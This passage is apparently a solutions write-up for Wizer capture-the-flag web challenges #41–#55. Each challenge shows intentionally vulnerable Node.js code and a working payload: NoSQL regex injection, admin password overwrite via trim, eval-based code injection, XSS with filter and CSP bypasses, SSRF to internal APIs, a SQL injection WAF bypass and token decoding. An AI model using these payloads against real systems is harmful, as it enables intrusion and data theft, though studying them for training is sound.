console.log("apiName2 : ", apiName);
let verb  = json.api.substring(json.api.lastIndexOf('.') + 1);
console.log("verb: ", verb);
// default to POST if no verb is provided
if(verb === apiName) {
    verb = 'POST';
}
console.log("api:", apiName, "verb:", verb);

if (requireAuthentication.includes(apiName.toLowerCase())) {
    if(!allowedVerbs.includes(verb)) {
        console.log("Invalid verb");
        
    }
}else {
    // remove the verb from the api and default to POST
    apiName = api.replaceAll('.POST', '').replaceAll('.GET', '');
    console.log("From else apiName: ",apiName, json )
}
```





<br /><br />

### **#41: COMPANIES API Phase 2**

**Goal:** Via Companies API, get the list of all companies

**Code:**

```javascript
import clientPromise from "../../lib/mongodb";

const isValid = (value) => {
    const checkMalicious = RegExp(
        `("\\$ne")+|("\\$eq")+|("\\$not")+` +
        `|("\\$in")+|("\\$nin")+|("\\$gt")+` +
        `|("\\$gte")+|("\\$lt")+|("\\$lte")+` +
        `|("\\$nor")+|("\\$and")+|("\\$exists")+` +
        `|("\\$type")+|(\\.)+|(\\^)+` +
        `|(\\[)+|(\\+)+|(\\*)+|(\"\"+)+`
      );
    const checkIsUUID = RegExp(`^.*-.*-.*-.*-.*$`)
    const stringValue = JSON.stringify(value);
    return stringValue.length == 42 && 
      stringValue.search(checkIsUUID) === 0 && 
      stringValue.search(checkMalicious) === -1;
}

export default async (req, res) => {
    try {
        if(typeof(req.body) === 'object' && isValid(req.body.company_id)) {
            const client = await clientPromise;
            const db = client.db("challenge_5");
            const company = await db
                .collection("companies")
                .find({ company_id:  req.body.company_id})
                .maxTimeMS(5000)
                .toArray();
            res.send(JSON.stringify(company));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    }
};
```

The company_id length must be 42 and to be uuid we should add - - - - - and i made the uuid optional in the regex with "?"

Solution: 

```json
{
   "company_id":{
      "$regex":"((1-1-1-1--)?)",
      "$options":"i"
   }
}

OR

{
   "company_id":{
      "$regex":"((1-1-1-1-11111111111-1111)?)"
   }
}
```

<br />

**Debugging code:**

```javascript
const isValid = (value) => {
    const checkMalicious = RegExp(
        `("\\$ne")+|("\\$eq")+|("\\$not")+` +
        `|("\\$in")+|("\\$nin")+|("\\$gt")+` +
        `|("\\$gte")+|("\\$lt")+|("\\$lte")+` +
        `|("\\$nor")+|("\\$and")+|("\\$exists")+` +
        `|("\\$type")+|(\\.)+|(\\^)+` +
        `|(\\[)+|(\\+)+|(\\*)+|(\"\"+)+`
      );
    const checkIsUUID = RegExp(`^.*-.*-.*-.*-.*$`)
    const stringValue = JSON.stringify(value);
    
    console.log("stringValue ",stringValue)
    console.log("stringValue.length ",stringValue.length)
    console.log("stringValue.search(checkIsUUID) ",stringValue.search(checkIsUUID))
    console.log("stringValue.search(checkMalicious) ",stringValue.search(checkMalicious))

    return stringValue.length == 42 && 
      stringValue.search(checkIsUUID) === 0 && 
      stringValue.search(checkMalicious) === -1;
}

let input1 = "550e8400-e29b04-41d4745-a17164-446654545"
let input2 = "{$regex:''},$comment:173-454-a14-46-5474"
let input3 = '{"$regex":"","$comment":"----1"}'
let input4 = '{\"$regex\":\"()\"},\"$comment\":----'
let input5 = '{"$regex":"(((((((((((()))))))))))"}' 
let input = '{$regex:"","$options":"7-0-2-1-3"}' 
if (isValid(input)){
    console.log("Valid input: ",input)
}else{
    console.log("Not Valid input!! ",input)
}
```



<br /><br />





### \#42: CRM USERS FILTER V2

**Goal:** Get the full unfiltered list of CRM users using '/filterCRMUsers' endpoint and win the flag!

**Code:**

```javascript
const availableFields = [
    'id', 'firstName', 'lastName', 'phoneNumber', 
    'title', 'department', 'email'
];

function filter(items, field, value) {
	const filtered = [];
	for (let i = 0; i < items.length; ++i) {
		if (items[i][field] === value) {
			filtered.push(items[i]);
		}
	}
	return filtered;
}

app.post('/filterCRMUsers', function(req, res) {
	let [field, value] = [req.body.field, req.body.value];
    // Validate the field
    if(!(String(field)?.trim())) {
        field = 'id';
    }
    const fieldName = field.toString().replaceAll(',', '');
    if(availableFields.includes(fieldName)) {
        const results = filter(CRMUsers, field, value);
        res.json(results);
        return;
    } else {
        res.status(400).send(`Invalid field: ${field}`);
    }   
});
```

Note that the developer used `field` in this line `const results = filter(CRMUsers, field, value);` instead of `fieldName`.

in this condition `if (items[i][field] === value)`. it will be `field = i,d`  and  `value = undefined` and ` items[i][field] = undefined`. so it will be `if(undefined === undefined)`

<br />

```json
{"field":"i,d"}
```

reference:

- https://www.mongodb.com/docs/manual/reference/operator/query/regex/
- https://onecompiler.com/mongodb

<br /><br />

**Debugging code:**

```javascript
let users = [{"id":"000001","firstName":"Mor","lastName":"Stein","phoneNumber":"+1(887)998-0001","title":"Head of Engineering","department":"Engineering","email":"mor.s@ourawesomecompany.com"},{"id":"000002","firstName":"Jack","lastName":"Boralis","phoneNumber":"+1(987)192-1001","title":"Marketing Manager","department":"Marketing","email":"jack.b@ourawesomecompany.com"},{"id":"000003","firstName":"Bob","lastName":"Shakill","phoneNumber":"+1(308)334-4552","title":"Sales Manager","department":"Sales","email":"bob.s@ourawesomecompany.com"},{"id":"000004","firstName":"Gery","lastName":"Shredder","phoneNumber":"+1(299)564-3234","title":"CEO","department":"C-Suite","email":"gary.s@ourawesomecompany.com"},{"id":"000005","firstName":"Freddy","lastName":"Orange","phoneNumber":"+1(345)533-6687","title":"CFO","department":"C-Suite","email":"freddy.s@ourawesomecompany.com"}]

function filter(items, field, value) {
	const filtered = [];
	for (let i = 0; i < items.length; ++i) {
        console.log("[5] >> field: ",field, " value: ",value, "items[i][field] ",items[i][field], "items[i]: ", items[i])
		if (items[i][field] === value) {
            console.log("[6] >> field: ",field, " value: ",value, "items[i][field] ",items[i][field])
			filtered.push(items[i]);
		}
	}
	return filtered;
}

const availableFields = [
    'id', 'firstName', 'lastName', 'phoneNumber', 
    'title', 'department', 'email'
];

let f = "i,d", v = undefined
let [field, value] = [f, v];
console.log("[1] >> field: ",field, " value: ",value)
// Validate the field
if(!(String(field)?.trim())) {
    field = 'id';
}
console.log("[2] >> field: ",field, " value: ",value)
const fieldName = field.toString().replaceAll(',', '');
console.log("[3] >> field: ",fieldName, " value: ",value)
if(availableFields.includes(fieldName)) {
    console.log("[4] >> field: ",fieldName, " value: ",value)
    const results = filter(users, field, value);
    console.log("results: ", results)
} else {
    console.log(`Invalid field: ${field}`)
}  
```

<br /><br />













### \#43: GET THE ADMIN PROFILE

**Goal:** Login as an admin! (login page: https://chal43-alal08.vercel.app/)

code:

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const path = require('path');
const dotenv = require('dotenv');
dotenv.config();
const app = express();
app.use(bodyParser.json());
app.use(cors());

function auth(req, res, next) {
    const token = req.body['session'];
    if (!token) {
        return res.status(401).json({ message: 'Authentication required' });
    }
  
    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ message: 'Invalid token' });
        req.user = user;
        if (user && user.username === "admin") {
            req.admin = true;
        } else {
            req.admin = false;
        }
        next();
    });
}

// In-memory database (temporary dictionary object) including the default admin user
const users = {};
users["admin"] = { password: process.env.AdminPassword };

// Serve the entire 'public' folder as static assets
app.use(express.static(path.join(__dirname, 'public')));

// Register a new user
app.post('/register', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  // check password strength (8 char min, special char, digit, uppercase and lowercase)
  const passwordRegex = /^(?=.*d)(?=.*[a-z])(?=.*[A-Z])(?=.*[^a-zA-Z0-9]).{8,}$/;

  if (!passwordRegex.test(password)) {
    return res.status(400).json({ message: 
      'Password needs to be at least 8 charecters long and include at least one: digit, lowecase letter, uppercase letter and a special charecter' });
  }

  if (users[username]) {
    return res.status(400).json({ message: 'Username already exists' });
  }
  else {
    //successfully registered
    const user = users[username.trim()] = {}
    user.password = password;
    res.status(201).json({ message: 'Registration successful' });
  }
});

// Login and generate a JWT token
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  console.log(users);
  const user = (users[username] && users[username].password === password) ? 
                { username, isAdmin: username === "admin" ? true : false  } : null;
  if (!user) {
    return res.status(401).json({ message: 'Invalid credentials' });
  }

  const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
  res.json({ token });
});

// Profile page accessible only to authenticated users
app.post('/profile', auth, (req, res) => {
    if (req.admin) {
        res.json({ message: 'You are the admin!'});
    } else {
        res.json({ message: 'Welcome to your profile, ' + req.user.username + '. You are not the admin.' });
    }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
```

During the registration process, the system first checks if the username is `"admin"`. If the username is not `"admin"`, it trims the `username` parameter using `username.trim()` and saves it in the user object.

For example, if the username is `"admin "` (with a space at the end), there is no username in the `users` object called `"admin "`. The `trim()` function will remove the space and save it as `"admin"` instead of `"admin "`. As a result, it will overwrite the existing `"admin"` user's password with the new password.

```json
POST /register

{"username":"admin ","password":"1234qwer!@Kk"}

POST /login 

{"username":"admin","password":"1234qwer!@Kk"}

POST /profile

{"session":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzM3NzU3Nzk5LCJleHAiOjE3Mzc3NjEzOTl9.vr3C_OdRgnzTob5EDyPzeqYTs_7a0NWy0EYqZ3LL1EA"}
```

<br />

**Debugging code:**

```javascript
const users = {};
users["admin"] = { password: "Sup3rS3cre7P@55W0rd!" };
console.log("users: ",users);
console.log("users.username: ",users.username);
console.log("users.password: ",users.password);
console.log("users.admin.password: ",users.admin.password);

let username = "admin ", password="testpass"


if(users[username]){
  console.log("Admin True: ",users["admin"]);
}else{
  console.log("Admin False: ",users["admin"]);
  const user = users[username.trim()] = {}
  user.password = password;

}


console.log("users2: ",users);
console.log("users2 test: ",users["admin"]);
console.log("users2 test pass: ",users["admin"].password);
```





<br /><br />



### \#44: LOGIN FLAG

**Goal:** Make the app get the flag for you!

**Code:**

```javascript
import express from 'express';
import bodyParser from 'body-parser';
import { config } from 'dotenv';
import { getFlag } from './flag.js';

config();
const app = express();
app.use(bodyParser.json());

// Simulated database of user accounts
const userDatabase = {
  admin: { username: 'admin', role: 'admin'},  
  user: { username: 'user', role: 'user' },
};

// Deserialize user session data
function deserializeSession(serializedData) {
  return eval(`(${serializedData})`);
}

// Route to handle user session
app.post('/login', (req, res) => {
  const { sessionData } = req.body;

  if (!sessionData) {
    return res.status(400).send('Session data is required.');
  }

  try {
    // Deserialize the session data
    const session = deserializeSession(sessionData);
    
    if (session && userDatabase[session.username]) {
      const user = userDatabase[session.username];
      res.send(`Welcome ${user.username}! Your role is: ${user.role}`);
    } else {
      res.status(401).send('Invalid session data.');
    }
    RevertDefaultUsersChanges();
  } catch (err) {
    console.error('Deserialization error:', err);
    res.status(500).send('An error occurred while processing the session data.');
  }
});

// Reset the admin and user accounts to their default values
const RevertDefaultUsersChanges = () => {
  userDatabase.admin = { username: 'admin', role: 'admin' };
  userDatabase.user = { username: 'user', role: 'user' };
}

// Start the server
app.listen(process.env.PORT, () => {
  console.log(`Server is running on http://localhost:${process.env.PORT}`);
});
```

<br />



```
(() => {const flag = getFlag();userDatabase.admin.role = flag; return {username: 'admin'} ;})()

OR

function(){const flag = getFlag();userDatabase.admin.role = flag; return {username: 'admin'} ;}()

OR

(function(){const flag = getFlag();userDatabase.admin.role = flag; return {username: 'admin'} ;})()
```



<br />

**Debugging code:**

```javascript
const userDatabase = {
  admin: { username: 'admin', role: 'admin'},  
  user: { username: 'user', role: 'user' },
};

// Deserialize user session data
function deserializeSession(serializedData) {
  console.log("deserializeSession: "+serializedData);
  return eval(`(${serializedData})`);
}


const  sessionData  = "{ 'username': 'admin'}"

const session = deserializeSession(sessionData);

console.log("sessionData: "+sessionData);
console.log("session: "+session.username);

if (session && userDatabase[session.username]) {
  console.log("in If: "+JSON.stringify(userDatabase[session.username])+ "   session.username: "+session.username);
  const user = userDatabase[session.username];
  console.log(`Welcome ${user.username}! Your role is: ${user.role}`);
} else {
  console.log('Invalid session data.');
}

```

<br />

<br />



### **#45: COMMENTS**

**Goal:** Inject an alert("Wizer")

**Code:**

```javascript
import { config } from 'dotenv';
config();
import express from 'express';
import marked from 'marked';
var ssn;
const app = express();
app.use(express.urlencoded({ extended: true })); // Built-in Express parser
app.use(express.json());
const sessions = {};

const getSession = (req) => {
    const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
    const sid = req.query.sid;
    if(sid && sid.match(uuidFormat)){
        if(ssn = sessions[sid]){
            //Session found
            ssn = sessions[sid];
        } else {
            //Session not found
            ssn = sessions[sid] = {};
        }
    } else {
        ssn = {};
    }
    return ssn;
};

// Homepage
app.get('/', (req, res) => {
    ssn = getSession(req);
    ssn.comments = ssn.comments || [];
    res.send(`
        <h1>Leave a Comment</h1>
        <form action="/comment?sid=${req.query.sid}" method="POST">
            <textarea style="width:250px;height:150px" name="content"></textarea><br>
            <button type="submit">Submit</button>
        </form>
        <h2>Comments</h2>
        ${ssn.comments.join('<br>')}
    `);
});

// Store and Render User Comments
app.post('/comment', (req, res) => {
    const userInput = req.body.content;
    const renderedContent = marked.parse(userInput);
    ssn = getSession(req);
    ssn.comments = ssn.comments || [];
    ssn.comments.push(renderedContent);
    res.redirect('/?sid=' + req.query.sid);
});

app.listen(process.env.PORT, () => {
    console.log(`Server running at http://localhost:${process.env.PORT}`);
});
```

<br />

```html
https://chal45-h8f5i.vercel.app/?sid=550e8400-e29b-41d4-a716-446655440000%22%0A%0D%3C/form%3E%3Cimg%20src=x%20onerror=alert(%22Wizer%22)%3E


https://chal45-h8f5i.vercel.app/?sid=550e8400-e29b-41d4-a716-446655440000"%0a%0d</form><img src=x onerror=alert("Wizer")>
```



<br />

<br />



### **#50: Preview Websites Metadata**

**Goal:** Uncover the flag by accessing an internal API

**Code:**

```javascript
import axios from 'axios';
import * as cheerio from 'cheerio';

export default async function handler(req, res) {
  const { url } = req.body;

  if (!url || !url.startsWith('http')) {
    return res.status(400).json({ error: 'Invalid or missing url parameter' });
  }

  try {
    // Log the requested URL
    console.log(`[preview-meta] Fetching: ${url}`);

    // If the URL targets an internal API route, add internal headers
    const allowInternalHeaders = url.includes('/api/internal/');
    let headers;

    if(allowInternalHeaders) {
      headers = { 
        'x-internal-header': process.env.INTERNAL_HEADER,
        'x-internal-service': process.env.INTERNAL_SERVICES 
      }
      res.setHeader('x-internal-service', process.env.INTERNAL_SERVICES);
    } else {
      headers = {};
    }

    // Perform the request
    const response = await axios.get(url, {
      timeout: 3000,
      headers,
    });

    const contentType = response.headers['content-type'] || '';
    const data = response.data;

    // If HTML, parse metadata
    if (contentType.includes('text/html')) {
      const $ = cheerio.load(data);
      const title = $('title').text();
      const description =
        $('meta[name="description"]').attr('content') || 'No description';

      return res.status(200).json({ url, title, description });
    }

    // Otherwise return raw (JSON or plain text)
    return res.status(200).json({ url, raw: data });
  } catch (e) {
    console.error(`[preview-meta] Error fetching URL: ${e.message}`);
    return res.status(500).json({ error: 'Failed to fetch or parse URL', details: e.message });
  }
}
```



```
GET /api/preview-meta
Content-Type: application/json
X-Internal-Service: ["user","admin"]

{
  "url": "http://localhost:32861/api/internal/admin"
}
```

Response

```
{
  "url": "http://localhost:36277/api/internal/admin",
  "raw": {
    "message": "You found the internal service!",
    "secret": "Wizer{55rf_!nt3rn4l_s3rv1c3}"
  }
}
```

Note: the port number changes. it is in the range (30000 - 40000)









### **#51:  Menu Level #2**

**Goal:** Inject an alert("Wizer").

**Code:**

```javascript
import styles from '../styles/Inner.module.css'
import { useRouter } from 'next/router';
import React from 'react';
import Image from 'next/image'

const sanitizeLink = (directLink) => {
  // prevent XSS (replace case insensitive `javascript` recursively in the URL)
  let searchMask = "javascript";
  let regEx = new RegExp(searchMask, "ig");

  while(directLink !== String(directLink).replace(regEx, '')) {
    directLink = String(directLink).replace(regEx, '');
  }

  return directLink;
}

export default function Home() {
  const router = useRouter();
  const [isMounted, setIsMounted] = React.useState(false);

  React.useEffect(() => {
    setIsMounted(true);
  }, []);

  let { directLink } = router.query;
  const isDirectLink = typeof directLink === 'string' && directLink.length > 0;

  React.useEffect(() => {
    if (isMounted && router.isReady && isDirectLink) {
      directLink = sanitizeLink(directLink);
      router.push(directLink);
    }
  }, [isMounted, router.isReady, isDirectLink]);

  if (!isMounted) return null; // prevent SSR

  return (
    <main className="text-center mt-5">
      <h3 className="h3 mb-3 fw-normal">Where do you want to go next?</h3>
      <h5 className="h5 mb-2 fw-normal" style={{ cursor: 'pointer' }}
        onClick={() => { router.push("/users") }}>List of Users</h5>
      <h5 className="h5 mb-2 fw-normal" style={{ cursor: 'pointer' }}
        onClick={() => { router.push("/groups") }}>List of Groups</h5>
      <h5 className="h5 mb-2 fw-normal" style={{ cursor: 'pointer' }}
        onClick={() => { router.push("/profile") }}>Your Profile</h5>
      <div className={styles.footer}>
        Powered by <Image src="/wizer.svg"
          alt="Wizer"
          width={200}
          height={100}
          className={styles.logo} />
      </div>
    </main>
  );
}
```

<br />

**Bypass with Tab Character:** (inserts a tab, `%09`, in the middle) or %0a or %0d

```
https://chal51-diou6.vercel.app/?directLink=java%09script:alert(%27Wizer%27)
OR
https://chal51-diou6.vercel.app/?directLink=java%0ascript:alert(%27Wizer%27)
OR
https://chal51-diou6.vercel.app/?directLink=java%0dscript:alert(%27Wizer%27)
```

<br />

Note: it will not work with %00, %20



<br />

<br />







### **#52:  Admins Secret**

**Goal:** Identify as an admin and get the flag!

**Code:**

```javascript
import express from 'express';
import bodyParser from 'body-parser';
import { config } from 'dotenv';
config();

const app = express();
app.use(bodyParser.json());

const users = [
  { id: 1, username: 'admin', role: 'admin', secret: `${process.env.ADMIN_KEY}` },
  { id: 2, username: 'user', role: 'user', secret: 'not for you' },
];

app.post('/secret', (req, res) => {
  const { user } = req.body;
  let thisUser; 

  // If 'admin', require a secret
  if (user.role === 'admin' || user.username === 'admin') {
    if (user.secret === process.env.ADMIN_KEY) {
      return res.send(`Welcome, true admin. Here's your flag: ${process.env.FLAG}`);
    } else {
      return res.status(403).send('Secret key required for admin access.');
    }
  }

  // Get user secret
  thisUser = users.find(u => u.username == user.username);

  if (thisUser) {
    return res.status(200).send(`
        user: ${user.username} 
        role: ${thisUser.role}
        secret is: ${thisUser.secret}
    `);
  } else {
    return res.status(403).send('User not found.');
  }  
    
});

app.listen(process.env.PORT, () => {
  console.log(`CTF running on http://localhost:${process.env.PORT}`);
});
```

<br />



```
POST /secret

{
  "user": {
    "username": [
      "admin"
    ]
  }
}
```

response

```
user: admin 
role: admin
secret is: JN98JRTVHU89H458J90JF40590FK450FKL0-L45
```

<br />

```
POST /secret

{
  "user": {
    "username": "admin",
    "role": "admin",
    "secret": "JN98JRTVHU89H458J90JF40590FK450FKL0-L45"
  }
}
```

response

```
Welcome, true admin. Here's your flag: FLAG{loose_comparison_is_not_secure}
```

<br />

<br />

<br />



### #53: Leaky Login Layer

**Goal:** Get the entire list of users with their hashed passwords to win the flag!

**Code:**

```javascript
import express from 'express';
import bodyParser from 'body-parser';
import { seedDatabase } from './seed.mjs';
import { config } from 'dotenv';

config();
const app = express();
app.use(bodyParser.json());

// In-app WAF
function isMaliciousInput(input) {
  console.log("Checking input for WAF:", input);
  const wafRegex = new RegExp(
    [
      '(\\b(SELECT|UNION|INSERT|DELETE|UPDATE|DROP|SCRIPT|ALERT|ONERROR|ONLOAD)\\b',
      '|["();<>\\s]',
      '|--',
      '|\\b(AND|OR)\b(?!/\\*\\*\\/))'
    ].join(''),
    'i'
  );
  return wafRegex.test(input);
}

app.post('/login', (req, res) => {
  const userInput = req.body.username;

  if (typeof userInput !== 'string') {
    return res.status(400).json({ error: "Username must be a string" });
  }

  if (isMaliciousInput(userInput)) {
    return res.status(403).json({ message: "❌ Blocked suspicious input by WAF" });
  }

  seedDatabase((db) => {
    const query = `SELECT * FROM users WHERE username = '${userInput}'`;
    console.log("Executing query:", query);

    db.all(query, [], (err, rows) => {
      if (err) return res.status(500).json({ error: "Database error" });

      if (rows.length > 0) {
        res.json({ users: rows });
      } else {
        res.json({ message: "No user found" });
      }

      db.close();
    });
  });
});

app.listen(process.env.PORT, () => {
  console.log(`Web server listening on port ${process.env.PORT}`);
});
```

The code builds a single, case-insensitive (`i` flag) regular expression from four main parts. It returns `true` if any of these patterns are found in the `input` string.

1. `'(\\b(SELECT|UNION|INSERT|DELETE|UPDATE|DROP|SCRIPT|ALERT|ONERROR|ONLOAD)\\b'`
   - This part looks for common **attack keywords**.
   - `\\b` is a **word boundary**. This ensures it matches the whole word `SELECT` but not a word like `SELECTION`.
   - `SELECT`, `UNION`, `INSERT`, etc., are common **SQL commands** used in SQLi attacks.
   - `SCRIPT`, `ALERT`, `ONERROR`, `ONLOAD` are common keywords used in **XSS** payloads.
2. `'|["();<>\\s]'`
   - This part looks for individual **special characters** often used in attacks.
   - `"`: Double quotes (for breaking out of attributes or strings).
   - `()`: Parentheses (for function calls like `alert(1)` or SQL subqueries).
   - `;`: Semicolon (for separating SQL statements).
   - `<>`: Angle brackets (for creating HTML tags like `<script>`).
   - `\\s`: Any whitespace character (like a space or tab).
3. `'|--'`
   - This looks for `--`, which starts a **single-line comment in SQL**. Attackers use this to truncate the original query and inject their own logic (e.g., `' OR 1=1 --`).
4. `'|\\b(AND|OR)\b(?!/\\*\\*\\/))'`
   - This is the most complex part. It looks for the words `AND` or `OR`, which are crucial for many SQLi attacks.
   - `(?!...)` is a **negative lookahead**. It means "match `AND` or `OR` *only if* it is **not** followed by `/**/`".

<br />

```json
{
  "username": "test'/**/OR/**/'1"
}
```



<br />

<br />

### #54: Highly Protected Comments

**Goal:** Inject an alert("Wizer").

**Code:**

```javascript
import express from 'express';
import { v4 as uuidv4 } from 'uuid';

const app = express();
const nonce = uuidv4();

app.get('/comment', (req, res) => {
  const rawComment = req.query.comment || 'No comment provided';

  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; object-src 'none';`
  );

  // Escape the comment to prevent XSS
  const escapedComment = rawComment
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');

  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Comment Viewer</title>
        <style>
          body { font-family: sans-serif; padding: 2rem; }
        </style>
      </head>
      <body>
        <h1>User Comment</h1>
        <div id="comment">${escapedComment}</div>
        <div id="debug-zone"></div>
        <script nonce="${nonce}">
        window.addEventListener('DOMContentLoaded', () => {
            // Only allow form elements to be injected for debugging
            const commentParam = new URLSearchParams(window.location.search).get('comment');
            if (commentParam) {
              const decoded = decodeURIComponent(commentParam);
              // Only inject if it contains a form element (Debugging)
              if (decoded.includes('<form') && decoded.includes('</form>')) {
                const debugZone = document.getElementById('debug-zone');
                debugZone.innerHTML = decoded;
                
                // Only execute scripts if debug mode is enabled
                if (window.isDebugMode) {
                  const scripts = debugZone.querySelectorAll('script');
                  scripts.forEach(script => {
                    // Only execute scripts with the correct nonce
                    if (script.nonce === '${nonce}') {
                      // Create a new script element and append it to execute
                      const newScript = document.createElement('script');
                      newScript.textContent = script.textContent;
                      newScript.nonce = script.nonce;
                      document.body.appendChild(newScript);
                    }
                  });
                }
              }
            }
            
            // Check if debug mode is enabled
            if (window.isDebugMode) {
              console.log('Debug mode is enabled!');
            }
          });
        </script>
      </body>
    </html>
  `);
});

app.listen(3000, () =>
  console.log('Vulnerable app running at http://localhost:3000/comment')
);
```

<br />

DOM Clobbering and CSP bypass

```
https://chal54-fiu36s.vercel.app/comment?comment=<form>test</form><a id=isDebugMode><script nonce="1f693b1b-d570-410e-bc5c-80c910fa7ea0">alert("Wizer")</script>
```

URL encoded:

```
https://chal54-fiu36s.vercel.app/comment?comment=%3Cform%3Etest%3C/form%3E%3Ca%20id=isDebugMode%3E%3Cscript%20nonce=%221f693b1b-d570-410e-bc5c-80c910fa7ea0%22%3Ealert(%22Wizer%22)%3C/script%3E
```



<br />

<br />



### \#55: Phantom Access

**Goal:** Get the internal report and win the flag!

**Code:**

```javascript
import dotenv from "dotenv";
dotenv.config();

import express from "express";
import crypto from "crypto";
const app = express();
app.use(express.json());

const XOR_KEY = crypto.createHash("md5").update("svc-telemetry").digest("hex").slice(0, 12);
function xorEncode(str, key) {
  return Buffer.from(
    [...str].map((char, i) => String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))).join("")
  ).toString("base64");
}

const coreCredString = `svc:${Math.floor(Date.now() / 1000)}`;
const staticSessionToken = Buffer.from(coreCredString).toString("base64");

// Session storage validation
if (!process.env.SVC_LEGACY_SESSION || !process.env.SYSADMIN_SESSION) {
  throw new Error("Missing required environment variables: SVC_LEGACY_SESSION or SYSADMIN_SESSION");
}

const sessionStore = {
  "alice": crypto.randomUUID(),
  "bob": crypto.randomUUID(),
  "svc": staticSessionToken,
  "svc_legacy": Buffer.from(process.env.SVC_LEGACY_SESSION).toString("base64"),
  "sysadmin": Buffer.from(process.env.SYSADMIN_SESSION).toString("base64"),
  "qa_bot": crypto.randomUUID(),
  "proxy": crypto.randomUUID()
};

// Simulated user info
const users = {
  "alice": { role: "user", info: "Hey Alice!" },
  "bob": { role: "user", info: "Welcome Bob!" },
  "svc": { role: "elevated", info: "Internal reports available." },
  "svc_legacy": { role: "elevated", info: "Deprecated service account." },
  "sysadmin": { role: "admin", info: "Admin console temporarily locked." },
  "qa_bot": { role: "automation", info: "QA bot last pinged at 03:42 UTC." },
  "proxy": { role: "service", info: "Proxy gateway ready." }
};

// Trace logger
function traceLookup(username) {
  const entry = {
    query: username,
    timestamp: Date.now()
  };

  if (username.match(/^testd+$/)) {
    entry.context = "test-trace";
    entry.debug = `traceId:${crypto.randomBytes(4).toString("hex")}`;
  }

  if (username.includes("debug") || username.length > 25) {
    entry.context = "log-overflow";
    entry.trace = `bytes:${username.length}`;
  }

  if (username.includes("root") || username.includes("sys")) {
    entry.context = "sys-audit";
    entry.note = `tracer:${Buffer.from("noop").toString("base64")}`;
  }

  if (username.includes("proxy") || username.includes("qa")) {
    entry.context = "legacy-auth-check";
    entry.trace = `fallbackToken:${Buffer.from("validate:proxy").toString("hex")}`;
  }

  if (username.includes("svc") || username.includes("%00")) {
    entry.context = "fallback-user-lookup";
    entry.note = `tracer:${xorEncode(coreCredString, XOR_KEY)}`;
  }

  return entry;
}

// Main endpoint - profile lookup
app.get("/api/profile", (req, res) => {
  const username = req.query.user;
  if (!username) {
    return res.status(400).json({ error: "Missing user parameter." });
  }

  const user = users[username];
  if (!user) {
    return res.status(404).json({
      error: "User not found",
      metadata: traceLookup(username)
    });
  }

  res.json({
    status: "ok",
    user: username,
    info: user.info
  });
});

app.post("/api/internal-report", (req, res) => {
  const sessionId = req.body.xSessionId;
  if (sessionId && sessionId === sessionStore.svc) {
    return res.json({
      status: "success",
      report: {
        metrics: {
          daily: [125, 117, 140],
          notes: {
            internal_summary: process.env.LAST_SUMMARY
          }
        }
      }
    });
  }

  return res.status(403).json({ error: "Access denied." });
});

app.get("/", (req, res) => {
  res.send(`
    <h2>Welcome</h2>
    <p>Try out the <code>/api/profile?user=USERNAME</code> endpoint.</p>
  `);
});

app.listen(process.env.PORT, () => {
  console.log(`Challenge running on http://localhost:${process.env.PORT || 4000}`);
});
```

<br />

```
GET /api/profile?user=svc0
```

response:

```json
{
  "error": "User not found",
  "metadata": {
    "query": "svc0",
    "timestamp": 1754096475232,
    "context": "fallback-user-lookup",
    "note": "tracer:F0RWCQYHVwYHCQVUUgo="
  }
}
```



```json
POST /api/internal-report

{
  "xSessionId": "c3ZjOjE3NTQwOTUyNjg="
}
```



**Debugging Code:**

```javascript
function xorDecode(base64Str, key) {
  const xorBuffer = Buffer.from(base64Str, "base64");
  const decoded = [...xorBuffer].map((byte, i) =>
    String.fromCharCode(byte ^ key.charCodeAt(i % key.length))
  ).join("");
  return decoded;
}

const XOR_KEY = crypto.createHash("md5").update("svc-telemetry").digest("hex").slice(0, 12);
const encodedTracer = "F0RWCQYHVwYHCQVUUgo="; // from note.tracer

const coreCredString = xorDecode(encodedTracer, XOR_KEY);
const staticSessionToken = Buffer.from(coreCredString).toString("base64");

console.log("coreCredString =", coreCredString);
console.log("staticSessionToken =", staticSessionToken);
```

